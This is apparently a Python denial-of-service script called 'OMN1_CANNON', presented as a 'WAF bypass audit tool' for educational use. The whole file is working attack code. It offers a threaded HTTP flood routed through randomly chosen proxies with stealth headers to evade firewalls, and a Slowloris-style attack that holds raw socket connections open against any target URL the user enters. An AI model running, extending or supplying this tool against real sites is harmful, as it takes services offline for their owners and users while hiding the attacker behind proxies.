import os
import time
import threading
from waf_bypass.stealth import generate_stealth_headers
from waf_bypass.proxy_api import fetch_proxy_list, get_random_proxy

def banner():
    os.system("clear" if os.name != "nt" else "cls")
    print("""
 ██████╗ ███╗   ███╗███╗   ██╗ ██╗
██╔═══██╗████╗ ████║████╗  ██║███║
██║   ██║██╔████╔██║██╔██╗ ██║╚██║
██║   ██║██║╚██╔╝██║██║╚██╗██║ ██║
╚██████╔╝██║ ╚═╝ ██║██║ ╚████║ ██║
 ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═╝
OMN1_CANNON v5.0 – WAF Bypass Audit Tool
Educational & Audit Use Only – mgledev
""")
    print("Choose a mode:")
    print("1. HTTP Flood")
    print("2. HTTP/2 Flood")
    print("3. Slowloris")
    print("4. Exit")

def http_flood(target, threads, proxies):
    def attack():
        headers = generate_stealth_headers()
        proxy = get_random_proxy(proxies)
        try:
            import requests
            r = requests.get(target, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            print(f"[+] Status: {r.status_code} via {proxy}")
        except Exception as e:
            print(f"[!] Error: {e}")
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()

def slowloris_sim(target, threads):
    def attack():
        try:
            import socket
            host = target.replace("http://", "").replace("https://", "").split("/")[0]
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 80))
            s.send(f"GET /?{os.urandom(6).hex()} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send("User-Agent: OMN1_CANNON/5.0\r\n".encode())
            time.sleep(10)
            s.close()
            print(f"[+] Slowloris packet sent to {host}")
        except Exception as e:
            print(f"[!] Error: {e}")
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.start()

def main():
    banner()
    choice = input("Enter option [1-4]: ").strip()

    if choice not in ["1", "2", "3", "4"]:
        print("Invalid choice.")
        return

    if choice == "4":
        print("Exiting...")
        return

    target = input("Enter full target URL (e.g., https://example.com): ").strip()
    threads = int(input("Number of threads: ").strip())
    proxies = fetch_proxy_list()

    if choice == "1":
        print("Launching HTTP Flood...")
        http_flood(target, threads, proxies)

    elif choice == "2":
        print("Launching HTTP/2 Flood... [experimental]")
        print("Feature requires 'httpx'. Not implemented in this demo.")
        return

    elif choice == "3":
        print("Launching Slowloris...")
        slowloris_sim(target, threads)

if __name__ == "__main__":
    main()